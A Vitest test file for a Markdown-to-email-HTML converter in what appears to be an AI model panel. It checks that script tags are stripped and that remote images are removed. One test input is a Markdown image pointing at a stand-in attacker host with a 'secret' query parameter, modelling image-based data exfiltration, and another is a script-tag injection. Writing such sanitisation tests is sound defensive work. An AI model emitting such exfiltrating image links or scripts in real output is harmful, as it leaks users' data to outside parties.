import { describe, expect, it } from 'vitest'
import { answerToHtml } from './AssistantPanel'

describe('answerToHtml', () => {
  it('turns the Markdown answer into email HTML', async () => {
    const md = '## Qualifying listings\n\n- **Data Analyst (remote)** — CT [1](mailr-cite:1) — [apply](https://jobs.example/a)\n- Other\n\nCount: 3 matched <script>x</script>'
    const html = await answerToHtml(md)
    expect(html).toContain('<p><strong>Qualifying listings</strong></p>')
    expect(html).toContain('<ul>')
    expect(html).toContain('<strong>Data Analyst (remote)</strong>')
    expect(html).toContain('href="https://jobs.example/a"')
    expect(html).not.toContain('mailr-cite')
    expect(html).not.toContain('##')
    expect(html).not.toContain('<script>')
  })

  it('drops remote images, keeping their alt text', async () => {
    const html = await answerToHtml('Summary ![chart](https://attacker.example/?d=secret) and ![](https://x.example/p.png) done')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('attacker.example')
    expect(html).not.toContain('x.example')
    expect(html).toContain('chart')
  })
})
